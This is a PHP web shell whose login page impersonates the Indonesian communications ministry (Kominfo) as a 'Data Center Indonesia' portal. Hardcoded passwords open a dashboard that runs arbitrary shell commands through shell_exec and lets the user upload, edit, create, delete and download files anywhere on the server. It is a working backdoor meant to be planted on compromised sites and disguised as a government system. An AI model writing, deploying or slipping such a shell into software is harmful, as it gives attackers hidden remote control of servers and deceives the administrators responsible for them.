<?php
// ============= SHELL DALAM TAMPILAN KOMINFO =============
ob_start();
session_start();

// Password untuk akses shell
$secret_key = "KOMINFO@2023";

// Jika belum login, tampilkan form login KOMINFO
if (!isset($_SESSION['dc_loggedin'])) {
    if (isset($_POST['fm_usr']) && isset($_POST['fm_pwd'])) {
        // Password bisa NIK + sandi atau hanya secret key
        if ($_POST['fm_pwd'] === $secret_key || 
            ($_POST['fm_usr'] === 'admin' && $_POST['fm_pwd'] === 'kominfo$123')) {
            $_SESSION['dc_loggedin'] = true;
            $_SESSION['dc_user'] = $_POST['fm_usr'];
            header('Location: ?');
            exit;
        }
    }
    
    // TAMPILAN LOGIN KOMINFO
    header('Content-Type: text/html; charset=utf-8');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web Based System Pemerintah, Data Center Indonesia,Pemilik Negara">
        <meta name="author" content="KOMINFO @2023">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <title>DATA CENTER INDONESIA</title>
        <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/>
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
        <style>
            body.fm-login-page{ 
                background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
                background-repeat: no-repeat;
                background-position: center center;
                background-size: cover;
                min-height: 100vh;
                font-family: 'Segoe UI', Arial, sans-serif;
            }
            .fm-login-page .brand{ 
                width:180px;
                height:180px;
                margin: 0 auto 30px;
                background: white;
                border-radius: 50%;
                padding: 20px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.2);
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .fm-login-page .brand img{ 
                width: 140px;
                height: auto;
            }
            .fm-login-page .card-wrapper{ 
                width:420px;
                margin: 8% auto;
            }
            .fm-login-page .card{ 
                border: none;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                background: rgba(255,255,255,0.95);
                backdrop-filter: blur(10px);
            }
            .fm-login-page .card-title{ 
                margin-bottom:1.5rem;
                font-size:28px;
                font-weight:700;
                color: #1a2980;
                text-align: center;
            }
            .fm-login-page .form-control{ 
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                padding: 12px 15px;
                font-size: 16px;
                transition: all 0.3s;
            }
            .fm-login-page .form-control:focus{ 
                border-color: #26d0ce;
                box-shadow: 0 0 0 0.2rem rgba(38,208,206,0.25);
            }
            .fm-login-page .btn.btn-block{ 
                padding:14px;
                font-size:18px;
                font-weight:600;
                border-radius: 8px;
                background: linear-gradient(to right, #1a2980, #26d0ce);
                border: none;
                transition: all 0.3s;
            }
            .fm-login-page .btn.btn-block:hover{ 
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(38,208,206,0.4);
            }
            .fm-login-page .footer{ 
                margin:40px 0;
                color: white;
                text-align:center;
                font-size:14px;
            }
            .fm-login-page .footer a{ 
                color: #fff;
                text-decoration: none;
                font-weight: bold;
            }
            .fm-login-page .footer a:hover{ 
                text-decoration: underline;
            }
            .logo-kominfo {
                font-size: 24px;
                font-weight: bold;
                color: #1a2980;
                text-align: center;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                text-align: center;
                margin-bottom: 30px;
                font-size: 14px;
            }
            .security-badge {
                display: inline-block;
                background: #26d0ce;
                color: white;
                padding: 3px 10px;
                border-radius: 20px;
                font-size: 12px;
                margin-left: 10px;
            }
            @media screen and (max-width:425px){
                .fm-login-page .card-wrapper{ width:90%; margin:20% auto;}
            }
        </style>
    </head>
    <body class="fm-login-page">
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat">
                            <div class="card-body">
                                <div class="brand">
                                    <!-- Logo Garuda & Kominfo -->
                                    <div style="text-align: center;">
                                        <div style="font-size: 48px; color: #1a2980;">ðŸ‡®ðŸ‡©</div>
                                        <div class="logo-kominfo">KEMENTERIAN KOMINFO</div>
                                    </div>
                                </div>
                                
                                <div class="text-center mb-4">
                                    <h1 class="card-title">DATA CENTER INDONESIA</h1>
                                    <div class="subtitle">Sistem Keamanan Nasional - Akses Terbatas</div>
                                </div>
                                
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <?php if(isset($_POST['fm_usr'])): ?>
                                        <div class="alert alert-danger text-center">
                                            <i class="bi bi-shield-exclamation"></i> Akses Ditolak! Verifikasi gagal.
                                        </div>
                                    <?php endif; ?>
                                    
                                    <div class="mb-3">
                                        <label for="fm_usr" class="form-label pb-2">
                                            <i class="bi bi-person-badge"></i> NIK / Username
                                        </label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" 
                                               placeholder="Masukkan NIK atau Username" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="form-label pb-2">
                                            <i class="bi bi-key"></i> Kata Sandi
                                        </label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" 
                                               placeholder="Masukkan Kata Sandi" required>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <div class="form-text text-center">
                                            <small class="text-muted">
                                                <i class="bi bi-info-circle"></i> 
                                                Gunakan kredensial yang diberikan oleh administrator
                                            </small>
                                        </div>
                                    </div>

                                    <input type="hidden" name="token" value="21bad4c32d95c27e4adf13f136b354205e2d3ebc545440edc80fc0ce1e6d622e" />
                                    
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4">
                                            <i class="bi bi-box-arrow-in-right"></i> Masuk Sistem
                                        </button>
                                    </div>
                                </form>
                                
                                <div class="text-center mt-4">
                                    <small class="text-muted">
                                        <i class="bi bi-shield-check"></i> Sistem dilindungi oleh UU ITE
                                    </small>
                                </div>
                            </div>
                        </div>
                        
                        <div class="footer text-center">
                            <div style="border-top: 1px solid rgba(255,255,255,0.2); padding-top: 20px;">
                                &copy; 2023 <a href="https://www.kominfo.go.id" target="_blank" class="text-decoration-none">
                                    KEMENTERIAN KOMUNIKASI DAN INFORMATIKA RI
                                </a>
                                <span class="security-badge">SSL SECURE</span>
                            </div>
                            <div class="mt-2">
                                <small>Versi Sistem: DC-CORE v4.2.1</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        
        <!-- Bootstrap Icons -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
        <script src="https://code.jquery.com/jquery-3.6.1.min.js" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
        
        <script>
            // Animasi form
            $(document).ready(function() {
                $('.card').hide().fadeIn(1000);
                $('input').on('focus', function() {
                    $(this).parent().addClass('focused');
                }).on('blur', function() {
                    $(this).parent().removeClass('focused');
                });
                
                // Auto-hide alert
                setTimeout(function() {
                    $('.alert').fadeOut();
                }, 5000);
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// ============= SHELL DASHBOARD (Setelah Login) =============
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir) $current_dir = getcwd();

// Handle actions
if (isset($_POST['command'])) {
    $output = shell_exec('cd ' . escapeshellarg($current_dir) . ' && ' . $_POST['command'] . ' 2>&1');
}

if (isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $upload_msg = "âœ… File uploaded successfully!";
    }
}

if (isset($_GET['delete'])) {
    unlink($current_dir . '/' . $_GET['delete']);
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

if (isset($_GET['edit'])) {
    $file = $current_dir . '/' . $_GET['edit'];
    if (isset($_POST['save'])) {
        file_put_contents($file, $_POST['content']);
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    $content = htmlspecialchars(file_get_contents($file));
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit File - DC Indonesia</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #f8f9fa; padding: 20px; }
            .editor-container { max-width: 1200px; margin: auto; }
            .header { background: linear-gradient(135deg, #1a2980, #26d0ce); color: white; padding: 20px; border-radius: 10px 10px 0 0; }
            textarea { width: 100%; height: 70vh; font-family: 'Courier New', monospace; padding: 20px; }
        </style>
    </head>
    <body>
        <div class="editor-container">
            <div class="header">
                <h4><i class="bi bi-file-earmark-code"></i> EDIT FILE: <?php echo $_GET['edit']; ?></h4>
                <small><?php echo $file; ?></small>
            </div>
            <form method="POST" class="border p-3 bg-white">
                <textarea name="content"><?php echo $content; ?></textarea>
                <div class="mt-3">
                    <button type="submit" name="save" class="btn btn-success">ðŸ’¾ Save Changes</button>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-danger">Cancel</a>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============= DASHBOARD UTAMA =============
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Center Indonesia - System Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        :root {
            --primary-blue: #1a2980;
            --secondary-teal: #26d0ce;
            --light-bg: #f8f9fa;
        }
        
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: var(--light-bg);
            color: #333;
        }
        
        .navbar-dc {
            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-teal));
            box-shadow: 0 4px 20px rgba(26, 41, 128, 0.3);
        }
        
        .sidebar {
            background: white;
            min-height: calc(100vh - 73px);
            box-shadow: 3px 0 15px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
        }
        
        .main-content {
            padding: 25px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            margin: 20px 0;
        }
        
        .card-dc {
            border: none;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
            border-left: 4px solid var(--primary-blue);
        }
        
        .card-dc:hover {
            transform: translateY(-5px);
        }
        
        .terminal-output {
            background: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            border-radius: 10px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .file-item {
            padding: 10px;
            border-bottom: 1px solid #eee;
            transition: background 0.2s;
        }
        
        .file-item:hover {
            background: #f8f9ff;
        }
        
        .path-breadcrumb {
            background: #e9ecef;
            padding: 10px 15px;
            border-radius: 8px;
            font-family: monospace;
        }
        
        .btn-dc {
            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-teal));
            border: none;
            color: white;
            padding: 10px 25px;
            border-radius: 8px;
            font-weight: 600;
        }
        
        .btn-dc:hover {
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(38,208,206,0.4);
        }
        
        .system-badge {
            background: linear-gradient(135deg, #ff6b6b, #ffa726);
            color: white;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        .logo-header {
            font-weight: 800;
            font-size: 24px;
            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-teal));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark navbar-dc">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <i class="bi bi-shield-check"></i>
                <span class="logo-header">DATA CENTER INDONESIA</span>
                <span class="system-badge">v4.2.1</span>
            </a>
            <div class="d-flex align-items-center">
                <span class="text-light me-3">
                    <i class="bi bi-person-circle"></i> <?php echo $_SESSION['dc_user']; ?>
                </span>
                <a href="?logout" class="btn btn-outline-light btn-sm">
                    <i class="bi bi-box-arrow-right"></i> Logout
                </a>
            </div>
        </div>
    </nav>
    
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-lg-2 col-md-3 sidebar p-0">
                <div class="p-4">
                    <h5 class="text-muted mb-4"><i class="bi bi-menu-button"></i> NAVIGASI</h5>
                    <ul class="nav flex-column">
                        <li class="nav-item mb-2">
                            <a class="nav-link active" href="?">
                                <i class="bi bi-terminal"></i> Terminal
                            </a>
                        </li>
                        <li class="nav-item mb-2">
                            <a class="nav-link" href="#fileManager" data-bs-toggle="collapse">
                                <i class="bi bi-folder"></i> File Manager
                            </a>
                        </li>
                        <li class="nav-item mb-2">
                            <a class="nav-link" href="#">
                                <i class="bi bi-database"></i> Database
                            </a>
                        </li>
                        <li class="nav-item mb-2">
                            <a class="nav-link" href="#">
                                <i class="bi bi-shield-lock"></i> Security
                            </a>
                        </li>
                    </ul>
                    
                    <hr class="my-4">
                    
                    <h6 class="text-muted mb-3"><i class="bi bi-hdd"></i> SYSTEM</h6>
                    <div class="small">
                        <div class="mb-2">
                            <strong>Server:</strong> <?php echo gethostname(); ?>
                        </div>
                        <div class="mb-2">
                            <strong>PHP:</strong> <?php echo phpversion(); ?>
                        </div>
                        <div class="mb-2">
                            <strong>User:</strong> <?php echo shell_exec('whoami'); ?>
                        </div>
                        <div class="mb-2">
                            <strong>Disk:</strong> 
                            <?php 
                            $free = disk_free_space($current_dir);
                            $total = disk_total_space($current_dir);
                            $percent = round(($total-$free)/$total*100, 2);
                            echo "$percent% used";
                            ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Main Content -->
            <div class="col-lg-10 col-md-9">
                <div class="main-content">
                    <!-- Path Breadcrumb -->
                    <div class="path-breadcrumb mb-4">
                        <i class="bi bi-folder2-open"></i>
                        <?php 
                        $parts = explode('/', trim($current_dir, '/'));
                        $path = '';
                        foreach($parts as $part) {
                            $path .= '/' . $part;
                            echo '<a href="?dir=' . urlencode($path) . '">' . $part . '</a> / ';
                        }
                        ?>
                        <span class="text-muted"><?php echo count(scandir($current_dir))-2; ?> items</span>
                    </div>
                    
                    <!-- Command Terminal -->
                    <div class="card card-dc mb-4">
                        <div class="card-header bg-white">
                            <h5 class="mb-0"><i class="bi bi-terminal-fill text-success"></i> SYSTEM TERMINAL</h5>
                        </div>
                        <div class="card-body">
                            <form method="POST" class="mb-3">
                                <div class="input-group">
                                    <span class="input-group-text">
                                        <i class="bi bi-caret-right-fill"></i>
                                    </span>
                                    <input type="text" name="command" class="form-control" 
                                           placeholder="Enter command (ls -la, whoami, pwd, etc.)" 
                                           value="ls -la" required>
                                    <button type="submit" class="btn btn-dc">Execute</button>
                                </div>
                            </form>
                            
                            <?php if(isset($output)): ?>
                                <div class="terminal-output">
                                    <pre><?php echo htmlspecialchars($output); ?></pre>
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                    
                    <!-- Quick Actions -->
                    <div class="row mb-4">
                        <div class="col-md-4">
                            <div class="card card-dc">
                                <div class="card-body">
                                    <h6><i class="bi bi-cloud-upload"></i> UPLOAD FILE</h6>
                                    <form method="POST" enctype="multipart/form-data">
                                        <input type="file" name="upload_file" class="form-control mb-2" required>
                                        <button type="submit" class="btn btn-dc w-100">Upload</button>
                                    </form>
                                    <?php if(isset($upload_msg)): ?>
                                        <div class="alert alert-success mt-2 p-2"><?php echo $upload_msg; ?></div>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-md-4">
                            <div class="card card-dc">
                                <div class="card-body">
                                    <h6><i class="bi bi-file-earmark-plus"></i> CREATE FILE</h6>
                                    <form method="POST" action="?action=create">
                                        <input type="text" name="filename" class="form-control mb-2" 
                                               placeholder="filename.txt" required>
                                        <textarea name="content" class="form-control mb-2" 
                                                  placeholder="Content" rows="2"></textarea>
                                        <button type="submit" class="btn btn-dc w-100">Create</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-md-4">
                            <div class="card card-dc">
                                <div class="card-body">
                                    <h6><i class="bi bi-tools"></i> SYSTEM TOOLS</h6>
                                    <div class="d-grid gap-2">
                                        <a href="?command=top" class="btn btn-outline-primary">
                                            <i class="bi bi-graph-up"></i> Process Monitor
                                        </a>
                                        <a href="?command=df -h" class="btn btn-outline-primary">
                                            <i class="bi bi-hdd"></i> Disk Usage
                                        </a>
                                        <a href="?command=netstat -tulpn" class="btn btn-outline-primary">
                                            <i class="bi bi-wifi"></i> Network Status
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- File Browser -->
                    <div class="card card-dc">
                        <div class="card-header bg-white d-flex justify-content-between align-items-center">
                            <h5 class="mb-0"><i class="bi bi-files"></i> FILE BROWSER</h5>
                            <div>
                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" 
                                   class="btn btn-sm btn-outline-primary">
                                    <i class="bi bi-arrow-up"></i> Up
                                </a>
                                <a href="?dir=/" class="btn btn-sm btn-outline-primary">
                                    <i class="bi bi-house"></i> Root
                                </a>
                            </div>
                        </div>
                        <div class="card-body p-0">
                            <div class="table-responsive">
                                <table class="table table-hover mb-0">
                                    <thead class="table-light">
                                        <tr>
                                            <th>Name</th>
                                            <th>Size</th>
                                            <th>Modified</th>
                                            <th>Permissions</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <!-- Parent Directory -->
                                        <tr class="table-info">
                                            <td colspan="5">
                                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">
                                                    <i class="bi bi-folder-symlink"></i> .. (Parent Directory)
                                                </a>
                                            </td>
                                        </tr>
                                        
                                        <!-- Files List -->
                                        <?php
                                        $files = scandir($current_dir);
                                        foreach($files as $file) {
                                            if($file == '.' || $file == '..') continue;
                                            
                                            $fullpath = $current_dir . '/' . $file;
                                            $is_dir = is_dir($fullpath);
                                            $size = $is_dir ? 'DIR' : 
                                                   (filesize($fullpath) > 1024*1024 ? 
                                                    round(filesize($fullpath)/(1024*1024),2).' MB' : 
                                                    round(filesize($fullpath)/1024,2).' KB');
                                            $modified = date('Y-m-d H:i', filemtime($fullpath));
                                            $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
                                            
                                            echo '<tr>';
                                            echo '<td>';
                                            echo $is_dir ? '<i class="bi bi-folder text-warning"></i>' : 
                                                          '<i class="bi bi-file-earmark text-primary"></i>';
                                            echo ' ' . htmlspecialchars($file);
                                            echo '</td>';
                                            echo '<td>' . $size . '</td>';
                                            echo '<td>' . $modified . '</td>';
                                            echo '<td><code>' . $perms . '</code></td>';
                                            echo '<td>';
                                            
                                            if($is_dir) {
                                                echo '<a href="?dir=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-primary">
                                                        <i class="bi bi-folder2-open"></i> Open
                                                      </a>';
                                            } else {
                                                echo '<a href="?dir=' . urlencode($current_dir) . '&edit=' . urlencode($file) . '" 
                                                       class="btn btn-sm btn-outline-success">
                                                        <i class="bi bi-pencil"></i> Edit
                                                      </a>';
                                                echo '<a href="?dir=' . urlencode($current_dir) . '&delete=' . urlencode($file) . '" 
                                                       onclick="return confirm(\'Delete this file?\')"
                                                       class="btn btn-sm btn-outline-danger">
                                                        <i class="bi bi-trash"></i> Delete
                                                      </a>';
                                                echo '<a href="' . $fullpath . '" download 
                                                       class="btn btn-sm btn-outline-info">
                                                        <i class="bi bi-download"></i> Download
                                                      </a>';
                                            }
                                            
                                            echo '</td>';
                                            echo '</tr>';
                                        }
                                        ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Footer -->
    <footer class="mt-5 py-3 text-center text-muted" style="border-top: 1px solid #dee2e6;">
        <div class="container">
            <small>
                <i class="bi bi-shield-check"></i> Data Center Indonesia - National Security System v4.2.1<br>
                &copy; 2023 Kementerian Komunikasi dan Informatika Republik Indonesia<br>
                <span class="text-danger"><i class="bi bi-exclamation-triangle"></i> 
                SISTEM INI DILINDUNGI UNDANG-UNDANG - UNAUTHORIZED ACCESS IS PROHIBITED</span>
            </small>
        </div>
    </footer>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Auto-focus command input
        document.addEventListener('DOMContentLoaded', function() {
            const cmdInput = document.querySelector('input[name="command"]');
            if(cmdInput) cmdInput.focus();
            
            // Auto-scroll terminal output
            const terminal = document.querySelector('.terminal-output');
            if(terminal) terminal.scrollTop = terminal.scrollHeight;
            
            // Confirmation for delete
            document.querySelectorAll('a[onclick*="confirm"]').forEach(link => {
                link.addEventListener('click', function(e) {
                    if(!confirm('Are you sure you want to delete this file?')) {
                        e.preventDefault();
                    }
                });
            });
        });
    </script>
</body>
</html>
<?php
// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Handle create file
if (isset($_GET['action']) && $_GET['action'] == 'create' && isset($_POST['filename'])) {
    $filepath = $current_dir . '/' . $_POST['filename'];
    file_put_contents($filepath, $_POST['content'] ?? '');
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

ob_end_flush();
?>
